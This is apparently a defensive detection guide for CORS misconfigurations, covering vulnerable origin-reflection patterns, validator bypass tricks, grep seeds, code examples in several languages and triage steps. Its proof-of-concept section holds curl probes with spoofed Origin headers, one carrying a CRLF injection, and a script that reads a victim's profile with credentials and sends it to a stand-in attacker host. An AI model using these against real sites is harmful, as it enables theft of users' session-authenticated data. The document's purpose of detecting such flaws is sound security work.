---
name: cors_misconfiguration
version: "0.3"
description: CORS misconfiguration detection (CWE-346, CWE-942)
---

# CORS Misconfiguration (CWE-346 / CWE-942)

Cross-Origin Resource Sharing relaxes the Same-Origin Policy. When `Access-Control-Allow-Credentials: true` is combined with a dynamically computed or overly permissive `Access-Control-Allow-Origin`, browsers may send cookies and secrets to attacker-chosen origins — enabling cross-origin data theft and CSRF escalation.

## Source -> Sink Pattern

**Sources**: Remote HTTP input reaching CORS response headers — request `Origin` header, query parameters, cookies, or custom headers copied into `Access-Control-Allow-Origin`.

**Sinks**:
- Setting `Access-Control-Allow-Origin` to `true`, `*`, `null`, or user-controlled values
- Reflecting `req.headers.origin` into `Access-Control-Allow-Origin` while `Access-Control-Allow-Credentials: true`
- Python middleware CORS config with weak origin validation (`startswith` on whitelist)
- Java servlet/filter writing unvalidated `Access-Control-Allow-Origin`

## Vulnerable Conditions

- `Access-Control-Allow-Credentials: true` with `Access-Control-Allow-Origin: *` (invalid in browsers but signals misconfiguration intent)
- Dynamic origin echo: `res.setHeader('Access-Control-Allow-Origin', req.headers.origin)` without whitelist
- `origin: true` in Node `cors` middleware (accepts any origin)
- `origin: null` with credentials enabled — sandboxed iframe can supply `null` origin
- Python `origin.startswith(allowed)` instead of exact match — bypass via `trusted.com.evil.com`
- Go CORS handler reflecting unvalidated request origin with credentials
- Credentialed ACAO trusting **all** of the app's own subdomains (anchored regex, `endsWith('.example.com')`, or wildcard) — resistant to look-alikes yet weaponizable via **subdomain takeover** or XSS on any subdomain (see *Correct Subdomain Allowlist, Wrong Trust Model*)
- **Invisible framework default — Apollo Server v3**: the batteries-included `apollo-server` package enables CORS by default, and an omitted `cors` option produces `Access-Control-Allow-Origin: *`. Flag the omission as a review candidate when responses were intended for specific frontends or expose sensitive unauthenticated data; do **not** claim cookie theft from wildcard ACAO alone because browsers reject credentials with `*`. An intentionally public API can safely choose this policy.

## Safe Patterns

- Fixed allowlist of exact origin strings; reject unknown origins (no reflection)
- `Access-Control-Allow-Credentials: true` only with a single explicit origin, never `*` or `null`
- Parse origin URL and compare scheme + host + port exactly against whitelist
- Default-deny CORS; enable per-route only where cross-origin credentialed access is required
- For Apollo Server v3, set `cors: { origin: ['https://app.example'], credentials: true }` when cookie-authenticated browser clients require CORS; omission is the wildcard default. Resolve `apollo-server` version and integration from dependency files before applying this framework-specific rule.

## Evasion Patterns

- Subdomain bypass: whitelist `https://example.com` but accept `https://example.com.attacker.com` via prefix checks
- **Suffix/prefix tricks**: `expected-host.attacker.com`, `attacker-expected-host.com` pass `endsWith('expected-host.com')` or `startsWith('https://expected-host')` but are attacker-controlled origins
- Null origin from sandboxed iframe or `data:` documents
- Case/unicode normalization differences between validator and browser
- Pre-flight vs simple-request divergence on different routes

## Origin Parser-Differential / Naive Parsing Evasion

When code **parses or pattern-matches** the `Origin` header instead of **exact allowlist membership**, attackers evade weak validators. `regex`, `startsWith`, `endsWith`, and `includes`/`contains` on the raw Origin string are unsafe — use exact string equality against a fixed set (or parse URL and compare scheme + host + port exactly).

**Unsafe validator patterns** (grep):
```bash
rg -n "origin\.(startsWith|endsWith|includes|match|search)|Origin.*\.match\(" --glob '*.{js,ts,py,go,java}'
rg -n "allowedOrigin.*indexOf|origin\.indexOf|\.contains\(origin" --glob '*.{js,ts,java}'
# regex-based origin validation (RegExp.test / re.match / Pattern.matcher) — often a subdomain rule, see next section
rg -n "\.test\(\s*origin|re\.(match|search|fullmatch)\(.*origin|Pattern\.compile.*origin|origin.*\.matches\(" --glob '*.{js,ts,py,java}'
```

| Evasion | Example Origin | Weak check bypassed |
|---------|----------------|---------------------|
| Suffix domain | `https://expected-host.attacker.com` | `endsWith('expected-host.com')` |
| Prefix domain | `https://attacker-expected-host.com` | `startsWith('https://expected-host')` |
| Embedded userinfo/port | `https://foo@evil:80@expected-host` | naive split/host extract |
| Backslash trick | `https://expected-host\@evil.com` or `https://evil.com\@expected-host` | non-RFC parsers normalizing `\` |
| Unicode / IDN look-alike | `https://evil-host` with homoglyph `ß` vs `ss` | case-fold without punycode canonicalization |
| CRLF in Origin | `https://evil.com%0d%0aX-Injected: true` | header injection if Origin echoed unsafely |

**VULN**:
```python
if origin.endswith('.expected-host.com'):          # accepts evil.expected-host.com
    resp.headers['Access-Control-Allow-Origin'] = origin
if origin.startswith('https://expected-host'):     # accepts https://expected-host.evil
    allow = True
```

**SAFE**: `if origin in ALLOWED_ORIGINS:` (exact set); or `urlparse(origin)` then compare `(scheme, hostname, port)` tuple against whitelist entries — no substring/regex matching on the full Origin string.

## Correct Subdomain Allowlist, Wrong Trust Model (credentialed CORS + subdomain takeover / XSS)

Distinct from the parser-differential bypasses above: here the origin validator is **correct** — an anchored regex or properly-parsed host check that matches **only genuine subdomains** of the app (`^https://[a-z0-9-]+\.example\.com$`, or `urlparse(origin).hostname.endswith('.example.com')` after real host extraction). No look-alike (`example.com.evil.com`, `evil-example.com`) passes, so none of the rules above fire. It is nonetheless a **credentialed-CORS vulnerability**: reflecting *any* of your own subdomains into `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true` makes the API only as strong as the **weakest** subdomain.

- **Subdomain takeover** — a dangling DNS record (`old.example.com` pointing at a deprovisioned S3/Heroku/GitHub-Pages/Azure/Fastly endpoint) lets an attacker claim `attacker.example.com`, a *real* subdomain that passes the allowlist → credentialed read of the victim's session-authed API responses. Cross-ref `subdomain_takeover.md`.
- **XSS / HTML-injection on any subdomain** — a reflected/stored XSS on a low-value subdomain (`blog.example.com`, `status.example.com`) can `fetch(api, {credentials:'include'})` and exfiltrate the response, because that subdomain is a trusted origin. Cross-ref `xss.md`.
- **User-content / shared / third-party subdomains** — `<user>.example.com`, preview/sandbox subdomains, or a subdomain running marketing/third-party software the attacker can influence are all trusted origins under a wildcard rule.

**SAST signal**: `Access-Control-Allow-Credentials: true` combined with a **dynamic** ACAO whose origin is accepted by *any* subdomain-matching rule — anchored regex (`/\.example\.com$/.test(origin)`, `RegExp`), suffix (`endsWith('.example.com')`), or a parsed-host `hostname.endswith('.example.com')`. The regex being anchored/correct does **not** clear the finding — the trust model, not the validator, is the bug.

**VULN**:
```js
// Correct: only real *.example.com subdomains match — but any one of them (XSS,
// takeover, user-content) becomes a credentialed cross-origin reader of the API.
if (/^https:\/\/[a-z0-9-]+\.example\.com$/.test(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
}
```

**SAFE**: for credentialed CORS, allowlist the **exact** origins that actually need cross-origin access (`https://app.example.com`), not the whole subdomain space. If subdomains genuinely need access, keep the list explicit and minimal, ensure none are attacker-influenceable (no dangling DNS, no user-content/third-party subdomains, no unpatched XSS), and treat every trusted subdomain as part of the API's attack surface.

**Grep seeds**:
```bash
rg -n "Allow-Credentials['\"]?\s*[,:].*true|setHeader\(['\"]Access-Control-Allow-Credentials" --glob '*.{js,ts,py,go,java}'
rg -n "\.test\(\s*origin|endsWith\(['\"]\.|hostname\.(endswith|endsWith)\(['\"]\.|\.example\.com\\\$" --glob '*.{js,ts,py,go,java}'
```

## Sanitizers / Barriers

- Explicit origin whitelist membership before setting ACAO
- Static constant origins
- Flows blocked when origin is not compared against approved list (credentials misconfiguration tracks taint to misconfigured header values)

Commonly affected languages: JavaScript, Java, Python, Go. No standard CORS configuration rules for Ruby, C#, or PHP.

## JavaScript / Node

- **VULN**: `cors({ origin: true, credentials: true })` — any origin receives credentialed responses
- **VULN**: `res.setHeader('Access-Control-Allow-Origin', req.headers.origin)` with credentials enabled
- **SAFE**: `origin: ['https://app.example.com']` or callback validating exact origin match

## Python

- **VULN**: `if origin.startswith('https://example.com')` — suffix bypass
- **VULN**: Flask-CORS / Starlette middleware with `allow_credentials=True` and reflected origins
- **SAFE**: `origin in ALLOWED_ORIGINS` with exact string equality

## Go

- **VULN**: CORS wrapper echoing `r.Header.Get("Origin")` into `Access-Control-Allow-Origin` without validation
- **SAFE**: fixed origin map lookup with exact match

## Java

- **VULN**: Filter setting `Access-Control-Allow-Origin` from request header when credentials allowed
- **SAFE**: hardcoded origin or whitelist set membership before header write

## Dynamic Test / PoC

**Origin reflection** — inspect response headers for echoed `Access-Control-Allow-Origin`:

```bash
curl -s -H 'Origin: https://evil.com' 'https://TARGET/api/endpoint' -D- | grep -i access-control
```

**Bypass probes** (when whitelist uses prefix/substring/regex matching — see Origin Parser-Differential section):

```bash
curl -s -H 'Origin: https://TARGET.evil.com' 'https://TARGET/api/endpoint' -D-
curl -s -H 'Origin: https://evil-TARGET.com' 'https://TARGET/api/endpoint' -D-
curl -s -H 'Origin: https://TARGET.attacker.com' 'https://TARGET/api/endpoint' -D-
curl -s -H 'Origin: https://foo@evil@TARGET' 'https://TARGET/api/endpoint' -D-
curl -s -H 'Origin: null' 'https://TARGET/api/endpoint' -D-
curl -s -H 'Origin: http://TARGET' 'https://TARGET/api/endpoint' -D-
curl -s -H 'Origin: https://TARGET%60.evil.com' 'https://TARGET/api/endpoint' -D-
curl -s -H 'Origin: https://TARGET_.evil.com' 'https://TARGET/api/endpoint' -D-
curl -s -H 'Origin: https://evil.com%0d%0a' 'https://TARGET/api/endpoint' -D-
curl -s -H 'Origin: https://evil-TARGET' 'https://TARGET/api/endpoint' -D-
```

**Impact confirmation** — when ACAO reflects attacker origin **and** `Access-Control-Allow-Credentials: true`:

```html
<script>
fetch('https://TARGET/api/user/profile', { credentials: 'include' })
  .then(r => r.json())
  .then(d => fetch('https://CANARY.attacker.example/?data=' + btoa(JSON.stringify(d))));
</script>
```

## Common False Alarms

- Public read-only API with `Access-Control-Allow-Origin: *` and **no** credentials — intentional public CORS
- Static single-origin ACAO on internal admin tools not accepting cross-origin credentialed requests
- Heuristic JS queries firing on non-credentialed endpoints — verify `Allow-Credentials` is actually true

## Business Risk

- Cross-origin theft of session-authenticated JSON/API responses
- CSRF escalation from "simple request" cookie delivery to full response readout
- Account takeover when credentialed CORS leaks profile or token endpoints

## Core Principle

Credentialed CORS requires an exact-origin allowlist. Never reflect attacker-controlled origin values into `Access-Control-Allow-Origin` when cookies or authorization headers may be sent.

## Detection Behavior

**Credentials misconfiguration**: path-problem taint from remote sources to sinks where credential headers (`Access-Control-Allow-Credentials`) are set alongside dynamically computed `Access-Control-Allow-Origin`. Flags leaks of secrets when origin is attacker-influenced.

**Permissive configuration**: flags `origin: true`, `origin: null`, or user-controlled origin values even without credentials — CSRF/data exposure risk when combined with cookie auth.

**Weak startswith whitelist (Python)**: specifically models weak `startswith` whitelist checks; reference CVE-2022-3457 pattern.

## Analyst Notes

- CORS misconfiguration does not replace CSRF tokens — permissive ACAO can worsen CSRF into data exfiltration
- Verify credentialed endpoints separately; public read APIs with `*` may be intentional
- Java unvalidated CORS origin and Go CORS misconfiguration rules are heuristic — confirm before high-severity reporting
- Consider `Content-Security-Policy` and cookie `SameSite` as related but distinct controls

## Ruby / C# / PHP

Manual review targets:
- Rack/Rails `rack-cors` gem configuration
- ASP.NET Core `AddCors` policy with `SetIsOriginAllowed(_ => true)`
- PHP `header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN'])`

## False Positive Triage Checklist

1. Confirm `Access-Control-Allow-Credentials: true` on affected route
2. Confirm browser-exposed endpoint (not server-to-server)
3. Distinguish intentional public API (`*`, no credentials) from misconfiguration
4. For heuristic findings, reproduce with reflected Origin header in preflight response
